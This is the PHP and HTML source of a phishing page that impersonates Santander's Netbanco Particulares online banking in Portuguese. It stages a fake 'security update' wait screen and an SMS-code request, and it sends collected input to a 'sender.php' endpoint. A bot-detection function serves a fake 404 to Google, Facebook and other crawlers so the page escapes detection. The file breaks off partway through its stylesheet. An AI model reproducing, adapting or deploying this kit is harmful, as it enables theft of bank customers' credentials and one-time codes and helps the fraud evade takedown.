<?php
//##############################################
$ASK_SECOND_SMS = true;
$WAITING_DURATION_1 = 2;
$WAITING_DURATION_2 = 30;

// WAIT PAGE
$TEXT_WAIT = "Uma grande atualização de segurança está em andamento, não atualize a página, isso pode demorar até 30 segundos.";

// EXIT PAGE
$TEXT_CONFIRMATION = "Obrigado, sua conta foi perfeitamente atualizada. Obrigado pelo seu tempo.....";
$BUTTON_EXIT = "Deixar";

//##############################################
$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$actual_link = preg_replace("/".basename($_SERVER['PHP_SELF'])."/","",$actual_link);

header('X-Frame-Options: DENY');

function DetectBot($USER_AGENT){
	$crawlers = array(
		'Google' => 'Google',
		'MSN' => 'msnbot',
		'Rambler' => 'Rambler',
		'Yahoo' => 'Yahoo',
		'AbachoBOT' => 'AbachoBOT',
		'accoona' => 'Accoona',
		'AcoiRobot' => 'AcoiRobot',
		'ASPSeek' => 'ASPSeek',
		'CrocCrawler' => 'CrocCrawler',
		'Dumbot' => 'Dumbot',
		'FAST-WebCrawler' => 'FAST-WebCrawler',
		'GeonaBot' => 'GeonaBot',
		'Gigabot' => 'Gigabot',
		'Lycos spider' => 'Lycos',
		'MSRBOT' => 'MSRBOT',
		'Altavista robot' => 'Scooter',
		'AltaVista robot' => 'Altavista',
		'ID-Search Bot' => 'IDBot',
		'eStyle Bot' => 'eStyle',
		'Scrubby robot' => 'Scrubby',
		'Facebook' => 'facebookexternalhit',
	);

	$crawlers_agents = implode('|',$crawlers);
	  
	if (strpos($crawlers_agents, $USER_AGENT) === false){
		return false;
	}else{
		return true;
	}
}

if(DetectBot($_SERVER['HTTP_USER_AGENT'])){
	echo "<center style=\"font-family:Arial;color:#666;line-height:20px;\"><h1>404</h1><div>Page not found</div></center>";
	die();
}

echo '<script>var WAITING_DURATION_1 = '.$WAITING_DURATION_1.';</script>';
echo '<script>var WAITING_DURATION_2 = '.$WAITING_DURATION_2.';</script>';
echo '<script>var ASK_SECOND_SMS = '.$ASK_SECOND_SMS.';</script>';
echo '<script>var ACTUAL_LINK = "'.$actual_link.'sender.php";</script>';
?>

<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <title>Netbanco Particulares - Santander</title>
  <meta name="robots" content="noindex">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="icon" type="image/png"
    href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAByFBMVEUAAADrAADsAADpAADoAADqAAD/AAD1AADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADsAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAADrAAD///8JjHLyAAAAlnRSTlMAAAAAAAAAAAMHNlSMuw0JvvtZEtDJGQ7I/ngCod8sBAhX+ZgFQBC670WWvw9J8bYMxf1iBpwV1M8dL+HKf31vAuIwG8yyIAr4nV3YMRhfsdItS+SwaPdHvBFqtYI68jfVIdYjK+vGhwGLNfCP5ugyXKaSrPRSue717cIUqfxwPPOqON7ZJjmQ2uoqm5e4O5NO5/oaVkabUxlSAAAAAWJLR0SX5m4brwAAAAd0SU1FB+MBEAwAJARkoBYAAAHkSURBVDjLfVL5WxJRFH0HsjLSGlpwJJUQTYqkkBqiTaCFRGyFSguiQsqsbDGyzUor03Kt8/c2yDJD3zjnl/fOeec7373vXiHqgK2NEGbANhssZu/Y3tRsFoEdOyU7TBzYtZt79poZHC2UWy0bO+DcR7a1b1AnOlzAfjfZ6TGOQJdaX/cBssdrWCesBw/5gMO9pN9naDhyNNAHBI+R7j6jCBxXGDoBhE+ydBoYfKfI05tgPSNTPmsQgX61xUgUiJ0jzwfrDUDjhYuwxclLQWAgzsRgUJcBS3Lo8pWrcPjJ3muAo4mB6zeGkpUfVXtPhSSmbwLeHvLWbWCYKqRQqruUopY9IpWEO4CnU9WHgbsZrltGwqoDWWWd8V4OaG8j7z/Aw3xZopKFyI1WCAuP0NAqk48x9qSqjebEuFwlT7NAsoV89nwiUNXkcRFhDS/UadrT5MtXmhYRkkZeTwLNb8jiW02TxJRG+O59pUUNU+KDjn38BEx/rjN8EV9ndHT2G8L6SM58Fw32vE74Ya1LyNut6hBtc5rycyyle5+zOUt/vXl+oVjTfv2uXYsL81sq4/IsLiXcZTUTL5/uxNKibrnRH1su+JWVTHp1NZ5ZUfyF5Zjzv50CXGtR7+TEwJ+/0TWXti3/AKjl8rl4DJCLAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTAxLTE2VDEyOjAwOjM2KzAxOjAwf3c+cQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0wMS0xNlQxMjowMDozNiswMTowMA4qhs0AAABXelRYdFJhdyBwcm9maWxlIHR5cGUgaXB0YwAAeJzj8gwIcVYoKMpPy8xJ5VIAAyMLLmMLEyMTS5MUAxMgRIA0w2QDI7NUIMvY1MjEzMQcxAfLgEigSi4A6hcRdPJCNZUAAAAASUVORK5CYII=">

  <style>
  body,
  h1,
  h2,
  h3,
  div,
  input,
  label,
  span,
  b,
  p,
  td,
  tr,
  option,
  select,
  center {
    font-family: 'Open Sans Condensed', sans-serif;
  }

  body {
    padding: 0px;
    margin: 0px;

  }

  .center {
    max-width: 920px;
    margin: 0px auto;
  }

  .header {
    position: relative;
    top: 0;
    height: 60px;

    padding: 0 calc((100% - 900px) / 2);
    background-color: #FFFFFF;
    box-shadow: 0 0 4px rgba(0, 0, 0, 0.2);
    z-index: 2;
  }

  label {
    color: #606366;
    font-size: 13px;
  }

  a {
    color: #606366;
    font-size: 13px;
    text-decoration: underline;
  }

  .bitinput {
    color: #606366;
    height: 100%;
    padding: 1px 5px;
    width: 100%;
    font-size: 13px;
    border: 1px solid #86888A;
    width: 190px;
    outline: none;
    padding: 3px;
    margin-top: 3px;
    font-size: 14px;
    border: solid 1px #C3DEE7;
    /* border-radius: 4px; */
    background-color: #FFFFFF;
    width: 50px;
  }

  button {
    background-color: #EC0000;
    border-radius: 4px;
    border: none;
    color: #FFF;
    font-size: 12px;
    min-height: 34px;
    /* width: 100px; */
    font-weight: bold;
    overflow: hidden;
    cursor: pointer;
    outline: none;
    font-size: 14px;
    font-weight: 600;
    height: 40px;
    padding: 0 30px;
    border-radius: 20px;
    color: #FFFFFF;
    cursor: pointer;
    transition: background-color 140ms;
  }

  .loader {
    position: relative;
    background: url(data:image/gif;base64,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) center 16px no-repeat;
    /* background-color: #EFEFEF; */
    /* background-size: 48px; */
    /* border: 1px solid #B8B8B8; */
    /* box-shadow: -4px 4px #B8B8B8; */
    height: 88px;
    margin: -44px auto 0;
    right: 0;
    width: 88px;
  }

  .loader span {
    font-size: 11px;
    font-weight: bold;
    position: absolute;
    top: -17px;
    color: #333;
    left: 23px;

  }

  h1 {
    color: #666;
